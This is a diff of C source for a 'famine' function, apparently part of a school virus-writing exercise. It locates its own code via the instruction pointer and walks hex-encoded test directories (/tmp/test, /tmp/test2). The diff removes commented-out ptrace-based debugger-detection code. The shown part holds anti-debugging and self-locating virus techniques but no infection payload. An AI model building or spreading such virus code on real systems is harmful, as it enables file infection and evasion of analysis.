@@ -14,8 +14,6 @@
 
 #define BUFF_SIZE 0x1000
 
-bool	mytest();
-
 void famine() {
 	byte		*start_rip;
 	get_rip(start_rip);
@@ -27,32 +25,14 @@ void famine() {
 	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
 	char		max_path[513];
 	dirent		*d;
-	// uint64_t	string = 0x000a303132333435;
 	uint64_t s = 0x0A6F6C6C6568;
-	// uint64_t detected = 0x0a6365746564;
 	profiling	this;
 
 	start_rip -= 0x12;
 	this = get_profiling(start_rip);
 
-	// i want to write start_rip value
 	(void)this;
-
-	// write(ret, 1, &string, sizeof(uint64_t));
 	write(ret, 1, &s, sizeof(uint64_t));
-	// write(ret, 1, "aaaaa\n", 6);
-
-	// check_debugger();
-	// int64_t test = 0;
-	// ptrace(ret, 0, 0, 0, 0); // Si échec, un débogueur est attaché
-    // if (ret < 0) {
-    //     write(ret, 1, &detected, sizeof(uint64_t));
-    //     exit(123);
-    // }
-
-	// if (mytest()) {
-	// 	exit(123);
-	// }
 
 	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
 		str	dir_name = (str)&directories[dir_index];
@@ -109,13 +89,5 @@ void famine() {
 			max_path[i] = 0;
 	}
 
-	// write(ret, 1, &string, 8);
 	write(ret, 1, &s, sizeof(uint64_t));
-}
-
-
-bool	mytest() {
-	uint64_t	ret;
-	ptrace(ret, 0, 0, 0, 0);
-	return ret;
 }
